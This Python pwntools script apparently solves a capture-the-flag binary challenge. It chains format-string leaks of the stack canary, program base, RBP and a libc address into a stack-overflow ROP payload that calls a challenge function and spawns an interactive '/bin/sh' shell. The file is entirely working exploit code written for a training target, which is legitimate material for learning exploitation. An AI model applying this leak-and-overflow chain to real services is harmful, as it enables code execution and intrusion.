#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys 

exe = context.binary = ELF(sys.argv[1])
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


#================= Canry Leak ==================================
io = start()
io.sendline(b"PRINTS")
io.sendline(b"%43$p")
io.sendline(b"EXEC")
canary = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
print(f"Canary: {hex(canary)}")

#================= Base Leak ==================================
io.sendline(b"PRINTS")
io.sendline(b"%45$p")
io.sendline(b"EXEC")
call_site = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
live_exec_instruction = call_site - 236 
base_addr = live_exec_instruction - exe.sym['exec_instructions']
exe.address = base_addr
print(f"Base: {hex(base_addr)}")

#================= RBP Leak ==================================
io.sendline(b"PRINTS")
io.sendline(b"%44$p")
io.sendline(b"EXEC")
RBP = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
print(f"RBP: {hex(RBP)}")


pwn_func = exe.symbols["pwn_func6"]
print(f"pwn_func: {hex(pwn_func)}")
printf_addr = exe.got["printf"]
print(f"printf: {hex(printf_addr)}")


#================= Leak libc ==================================
io.sendline(b"PRINTS")
io.sendline(b"%1361$p")
io.sendline(b"EXEC")
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()

libc_leak = int(received, 16)

offset = libc.sym["_IO_2_1_stdin_"]
print(f"offset  adresse stdin: {hex(offset)}")
print(f"libc_leak :: {hex(libc_leak)}")
libc_base = libc_leak - offset

libc.address = libc_base
print(f"libc base: {hex(libc.address)}")
libc.address = 0x0 

rop = ROP(libc)
POP_RDI = rop.rdi 
print(f"POP_RDI: {hex(POP_RDI.address)}")
print(f"POP_RDI: {hex(POP_RDI.address+libc_base)}")

#================= Exploit ==================================

payload = b"".join([
    b"PRINTS ",
    b"A" * (272-8),     
    p64(canary),        
    p64(RBP),           
    p64(rop.rdi.address + libc_base), 
    p64(RBP + 64),      
    p64(pwn_func),      
    p64(0),             
    p64(0),             
    p64(0),             
    p64(0),             
    p64(RBP + 80),      
    p64(0),             
    b"/bin/sh\0"        
])
io.sendline(payload)
io.sendline(b"EXEC")
io.interactive()
